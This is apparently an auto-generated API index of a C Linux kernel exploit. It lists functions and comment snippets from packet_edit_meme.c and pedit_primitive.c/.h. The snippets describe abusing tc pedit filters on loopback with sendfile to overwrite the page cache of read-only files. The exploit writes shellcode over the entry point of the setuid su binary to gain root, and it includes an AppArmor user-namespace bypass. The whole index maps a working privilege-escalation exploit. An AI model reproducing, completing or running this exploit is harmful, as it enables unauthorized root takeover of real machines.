# API

## packet_edit_meme.c
Depends on: `pedit_primitive.h`
- `exec` (function) `packet_edit_meme.c:8` `* and exec()s su, so the setuid bit makes it euid 0 globally and the corrupted * cached page runs the shellcode as...`
- `find_su` (function) `packet_edit_meme.c:58` `static const char *find_su(void)`
- `elf_entry_offset` (function) `packet_edit_meme.c:72` `static long elf_entry_offset(int fd)` -- static const char *find_su(void) { struct stat info; int index; for (index = 0; SU_PATHS[index]; index++) { if...
- `write_proc_file` (function) `packet_edit_meme.c:94` `static void write_proc_file(const char *path, const char *value)`
- `corrupt_entry` (function) `packet_edit_meme.c:108` `static int corrupt_entry(int su_fd, long entry_offset)` -- Runs in the unshare()d child: map to uid 0, then write the shellcode over su's * entry, slot by slot, through the...
- `run_exploit` (function) `packet_edit_meme.c:139` `static int run_exploit(void)`
- `apparmor_userns_bypass` (function) `packet_edit_meme.c:212` `static void apparmor_userns_bypass(char *self)`
- `main` (function) `packet_edit_meme.c:231` `int main(int argc, char **argv)`

## pedit_primitive.c
Depends on: `pedit_primitive.h`
- `request_begin` (function) `pedit_primitive.c:109` `static void request_begin(int type, int flags)`
- `request_reserve` (function) `pedit_primitive.c:119` `static void *request_reserve(int length)`
- `request_append` (function) `pedit_primitive.c:127` `static void request_append(const void *data, int length)`
- `request_attr` (function) `pedit_primitive.c:132` `static void request_attr(int type, const void *data, int length)`
- `request_attr_str` (function) `pedit_primitive.c:141` `static void request_attr_str(int type, const char *text)`
- `request_nest_begin` (function) `pedit_primitive.c:146` `static struct rtattr *request_nest_begin(int type)`
- `request_blob_begin` (function) `pedit_primitive.c:157` `static struct rtattr *request_blob_begin(int type)` -- like request_nest_begin but without NLA_F_NESTED -- for the ematch entry whose * payload is a raw tcf_ematch_hdr...
- `request_nest_end` (function) `pedit_primitive.c:166` `static void request_nest_end(struct rtattr *attr)`
- `request_send` (function) `pedit_primitive.c:171` `static int request_send(int allow_enoent)`
- `link_up` (function) `pedit_primitive.c:194` `static int link_up(int index)`
- `clsact_delete` (function) `pedit_primitive.c:226` `static void clsact_delete(int index)`
- `clsact_add` (function) `pedit_primitive.c:240` `static int clsact_add(int index)`
- `append_pktlen_ematch` (function) `pedit_primitive.c:258` `static void append_pktlen_ematch(uint32_t threshold)` -- request_begin(RTM_NEWQDISC, NLM_F_CREATE | NLM_F_EXCL); memset(&msg, 0, sizeof(msg)); msg.tcm_family = AF_UNSPEC...
- `append_pedit_action` (function) `pedit_primitive.c:295` `static void append_pedit_action(const struct pedit_key_spec *keys, int key_count)` -- Emit one pedit action entry (kind + selector + per-key extensions) into the * action-list nest that the caller has...
- `ematch` (function) `pedit_primitive.c:339` `* pkt_len ematch (only the data skb is touched, no out-of-range log spam);`
- `egress_pedit_add` (function) `pedit_primitive.c:342` `static int egress_pedit_add(int index, const struct pedit_key_spec *keys, int key_count)` -- Install the egress pedit filter.
- `fill_ihl_key` (function) `pedit_primitive.c:374` `static void fill_ihl_key(struct pedit_key_spec *key)`
- `pedit_burst` (function) `pedit_primitive.c:384` `static int pedit_burst(int src_fd, const struct pedit_key_spec *keys, int key_count)` -- sendfile src_fd over a fresh loopback connection, arming `keys` on lo egress * only AFTER the handshake so the...
- `calibrate` (function) `pedit_primitive.c:437` `static int calibrate(void)` -- Land a marker at a known key offset and read it back so api_fd_write() can * translate a file offset into the...
- `setup` (function) `pedit_primitive.c:488` `int setup(void)`
- `api_fd_write` (function) `pedit_primitive.c:522` `int api_fd_write(int fd, off_t offset, const void *src, size_t size)`

## pedit_primitive.h
Imported by: `packet_edit_meme.c`, `pedit_primitive.c`, `test_cve.c`
- `bytes` (function) `pedit_primitive.h:4` `* * Native write unit is 4 bytes (one pedit key == one u32 via skb_store_bits);`
- `setup` (function) `pedit_primitive.h:19` `int setup(void);` -- Bring lo up, open the loopback listener, calibrate the skb->file offset * delta.
- `api_fd_write` (function) `pedit_primitive.h:24` `int api_fd_write(int fd, off_t offset, const void *src, size_t size);` -- Overwrite [offset, offset+size) of fd's page cache with src. fd may be O_RDONLY. size must be a multiple of...
